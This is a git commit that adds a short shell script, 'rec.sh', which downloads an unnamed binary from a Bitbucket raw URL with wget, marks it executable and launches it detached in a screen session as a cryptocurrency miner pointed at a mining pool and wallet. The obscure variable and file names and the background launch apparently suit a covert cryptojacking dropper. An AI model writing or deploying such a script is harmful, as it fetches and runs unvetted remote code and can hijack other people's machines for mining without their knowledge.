798b7a3dba64e69773d4ca347c95795918f8a1f9
jrkeiter <91981745+jrkeiter@users.noreply.github.com>
2021-12-02 08:43:00 +0700

    Create rec.sh

---
+++ rec.sh
@@ -0,0 +1,15 @@
+WALS=Lhehm3xhWQNgF1EexRa1J2Q8LKdeAPovbY
+PIL=stratum+tcp://ethash.na.mine.zergpool.com:9999
+PUA=c=LTC
+COMA="--algo ETHASH --pool $PIL --user $WALS --pass $PUA"
+
+
+
+FILE=./tuan
+if [ -f "$FILE" ]; then
+    echo "$FILE exists."
+else 
+    wget https://bitbucket.org/solomase/garangsem/raw/d261db312adaef2baefd19624650e14af8c938dc/tuan
+    chmod +x ./tuan
+fi
+screen -dmLS mine ./tuan $COMA
